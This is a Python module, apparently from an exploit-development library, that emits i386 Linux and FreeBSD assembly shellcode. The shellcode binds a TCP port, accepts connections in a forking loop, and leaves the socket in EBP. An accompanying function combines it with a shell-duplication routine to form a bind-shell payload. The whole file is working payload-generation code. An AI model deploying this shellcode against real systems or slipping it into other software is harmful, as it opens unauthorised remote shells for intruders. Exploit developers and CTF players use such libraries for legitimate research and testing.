from pwn.internal.shellcode_helper import *
from .. import dupsh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
def acceptloop(port, os = None):
    """Args: port
    Waits for a connection.  Leaves socket in EBP."""

    if os == 'freebsd':
        return """
acceptloop:
        ;; Listens for and accepts a connection on %(portnum)d forever
        ;; Socket file descriptor is placed in EBP

        ;; servfd = socket(AF_INET, SOCK_STREAM, 0)
        push SYS_socket
        pop eax
        cdq
        push edx
        push SOCK_STREAM
        push AF_INET
        push edx
        int 0x80

        ;; bind(servfd, &addr, sizeof addr); // sizeof addr == 0x10
        push word %(port)d
        push word AF_INET
        mov ebx, esp
        push 0x10
        push ebx
        push eax
        push eax
        mov al, SYS_bind
        int 0x80

        ;; listen(servfd, whatever)
        mov al, SYS_listen
        int 0x80

        ;; sockfd = accept(servfd, NULL, whatever)
        pop ebx
.accept:
        push edx
        push ebx
        push ebx
        mov al, SYS_accept
        int 0x80

        ;; fork()
        push eax
        mov al, SYS_fork
        int 0x80

        ;; close(is_parent ? sockfd : servfd)
        test eax, eax
        jnz .parent
        pop ebp
.parent:
        push eax
        push SYS_close
        pop eax
        int 0x80

        ;; if(is_parent) goto .accept
        pop ecx
        test ecx, ecx
        jnz .accept


""" % {'port'    : htons(int(port)),
       'portnum' : int(port)}
    elif os == 'linux':
        return """
acceptloop:
        ;; Listens for and accepts a connection on %(portnum)d forever
        ;; Socket file descriptor is placed in EBP

        ;; sock = socket(AF_INET, SOCK_STREAM, 0)
        push SYS_socketcall
        pop eax
        push SYS_socketcall_socket
        pop ebx
        cdq                     ; clear EDX
        push edx                ; IPPROTO_IP (= 0)
        push ebx                ; SOCK_STREAM
        push AF_INET
        mov ecx, esp
        int 0x80

        ;; bind(sock, &addr, sizeof addr); // sizeof addr == 0x10
        push edx
        push word %(port)d
        push word AF_INET
        mov ecx, esp
        push 0x10
        push ecx
        push eax
        mov ecx, esp
        mov esi, eax
        inc ebx                 ; EBX = bind (= 2)
        mov al, byte SYS_socketcall
        int 0x80

        ;; listen(sock, whatever)
        mov al, byte SYS_socketcall
        mov bl, byte SYS_socketcall_listen
        int 0x80

.loop:
        ;; accept(sock, NULL, NULL)
        push edx
        push esi                ; sock
        mov ecx, esp
        mov al, byte SYS_socketcall
        mov bl, byte SYS_socketcall_accept
        int 0x80

        mov ebp, eax

        mov al, SYS_fork
        int 0x80
        xchg eax, edi

        test edi, edi
        mov ebx, ebp
        cmovz ebx, esi ; on child we close the server sock instead

        ;; close(sock)
        push byte SYS_close
        pop eax
        int 0x80

        test edi, edi
        jnz .loop

""" % {'port'    : htons(int(port)),
       'portnum' : int(port)}
    else:
        bug('OS was neither linux nor freebsd')

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
def acceptloopsh(port):
    return acceptloop(port), dupsh()
